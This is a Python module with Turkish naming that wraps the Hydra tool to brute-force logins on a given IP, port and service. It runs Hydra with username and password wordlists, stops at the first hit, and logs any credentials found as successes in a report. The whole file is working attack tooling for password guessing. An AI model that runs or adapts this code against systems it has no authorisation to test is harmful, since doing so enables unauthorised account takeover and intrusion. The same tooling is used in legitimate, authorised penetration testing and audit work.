import subprocess
from utils.raporlayici import Raporlayici
from config import Ayarlar
class BruteForceBase:
    def __init__(self, hedef_ip, hedef_port, servis_adi):
        self.hedef_ip = hedef_ip
        self.hedef_port = hedef_port
        self.servis_adi = servis_adi
        self.raporlayici = Raporlayici()

    def saldir(self, kullanici_listesi, sifre_listesi):
        komut = self._komut_olustur(kullanici_listesi, sifre_listesi)
        print(f"[*] Çalıştırılan komut: {' '.join(komut)}")
        
        try:
            sonuc = subprocess.run(komut, capture_output=True, text=True, timeout=Ayarlar.HYDRA_TIMEOUT)
            
            if sonuc.returncode == 0 and "login:" in sonuc.stdout.lower():
                basarili_satirlar = [satir for satir in sonuc.stdout.splitlines() 
                                    if "login:" in satir.lower()]
                for satir in basarili_satirlar:
                    self.raporlayici.rapor_ekle(
                        self.servis_adi, 
                        self.hedef_ip, 
                        self.hedef_port, 
                        "BAŞARILI",
                        satir.strip()
                    )
                return True
            
            self.raporlayici.rapor_ekle(
                self.servis_adi,
                self.hedef_ip,
                self.hedef_port,
                "BAŞARISIZ",
                "Başarılı giriş bulunamadı"
            )
            return False
            
        except subprocess.TimeoutExpired:
            self.raporlayici.rapor_ekle(
                self.servis_adi,
                self.hedef_ip,
                self.hedef_port,
                "HATA",
                "Zaman aşımı"
            )
            return False
        except Exception as e:
            self.raporlayici.rapor_ekle(
                self.servis_adi,
                self.hedef_ip,
                self.hedef_port,
                "HATA",
                str(e)
            )
            return False

    def _komut_olustur(self, kullanici_listesi, sifre_listesi):
        return [
            "hydra",
            "-L", kullanici_listesi,
            "-P", sifre_listesi,
            self.hedef_ip,
            self._hydra_tipi(),
            "-s", str(self.hedef_port),
            "-t", str(Ayarlar.HYDRA_THREADS),
            "-f",
            "-o", f"sonuclar/{self.servis_adi.lower()}_sonuclari.txt"
        ]

    def _hydra_tipi(self):
        return self.servis_adi.lower()